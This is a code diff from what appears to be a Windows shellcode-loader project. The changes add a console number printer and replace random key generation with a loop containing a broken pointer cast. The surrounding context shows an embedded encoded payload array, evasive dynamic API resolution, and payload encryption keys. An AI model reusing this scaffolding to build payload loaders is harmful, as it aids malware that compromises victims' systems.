@@ -59,13 +59,31 @@ unsigned char payload[] =
 "\x1c\xd7\xa5\x7b\x60\x05\x02\x26\xd5\x6c\x43";
 
 
+void PrintDword(DWORD value, HANDLE hConsole)
+{
+	char buffer[33];
+	buffer[32] = '\0';  // Null-terminate the string
+	int pos = 31;
+
+	// Convert the DWORD to a string
+	do {
+		buffer[pos] = '0' + (value % 10);
+		value /= 10;
+		pos--;
+	} while (value != 0);
+
+	// Write the string to the console
+	DWORD dwWritten;
+	WriteConsoleA(hConsole, buffer + pos + 1, 32 - pos - 1, &dwWritten, NULL);
+}
+
+
 int main()
 {
 	API::APIResolver &resolver = API::APIResolver::GetInstance();
 
 	resolver.LoadModules();
 	resolver.ResolveAPI();
-	MessageBoxA(NULL, "here", "", NULL);
 
 	API::API_ACCESS  api = resolver.GetAPIAccess();
 
@@ -73,9 +91,7 @@ int main()
 	NTSTATUS status = NULL;
 	DWORD	 dwWritten;
 
-
 	tools.EnableDebugConsole();
-
 
 	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 	if (hConsole == INVALID_HANDLE_VALUE) {
@@ -88,39 +104,46 @@ int main()
 	//ZeroMemory(key, KEYSIZE);
 	//ZeroMemory(iv , IVSIZE);
 
-	
-	//tools.PrintConsole((const char*)tools.GetRandomNumber(api));
 
-	if (api.func.pRtlRandomEx)
-	{
-		tools.PrintConsole("function found in module");
+	//if (api.func.pRtlRandomEx)
+	//{
+	//	tools.PrintConsole("function found in module");
 
-		// Fill arrays with random numbers
-		for (auto& x : key) // Use reference to modify the original array
-		{
-			ULONG seed = tools.GetRandomNumber(api); // Use RandomNumber as the seed
+	//	// Fill arrays with random numbers
+	//	for (auto& x : key) // Use reference to modify the original array
+	//	{
+	//		ULONG seed = tools.GetRandomNumber(api); // Use RandomNumber as the seed
 
-			if (!NT_SUCCESS(status = api.func.pRtlRandomEx(&seed)))
-				/*tools.PrintConsole("rtlgenrandom failed");*/
-				return -1;
-			else
-				x = static_cast<unsigned char>(seed);
-		}
+	//		if (!NT_SUCCESS(status = api.func.pRtlRandomEx(&seed)))
+	//			/*tools.PrintConsole("rtlgenrandom failed");*/
+	//			return -1;
+	//		else
+	//			x = static_cast<unsigned char>(seed);
+	//	}
+	//	MessageBoxA(NULL, "here", "", NULL);
 
-		for (auto& x : iv) 
-		{
-			ULONG seed = tools.GetRandomNumber(api);
+	//	for (auto& x : iv) 
+	//	{
+	//		ULONG seed = tools.GetRandomNumber(api);
 
-			if (!NT_SUCCESS(status = api.func.pRtlRandomEx(&seed)))
-				//tools.PrintConsole("rtlgenrandom failed");
-				return -1;
-			else
-				x = static_cast<unsigned char>(seed);
-		}
-	}
+	//		if (!NT_SUCCESS(status = api.func.pRtlRandomEx(&seed)))
+	//			//tools.PrintConsole("rtlgenrandom failed");
+	//			return -1;
+	//		else
+	//			x = static_cast<unsigned char>(seed);
+	//	}
+	//}
+
+
+
+
+	auto word = tools.GetRandomNumber(api);
+
+	for (auto& x : key)
+		x = static_cast<unsigned char*>(tools.GetRandomNumber(api));
 
 	tools.PrintConsole("\n");
-	WriteConsoleA(hConsole, key, 32, &dwWritten, NULL);
+	PrintDword(word, hConsole);
 	Sleep(10);
 
 	SecureZeroMemory(key, KEYSIZE);
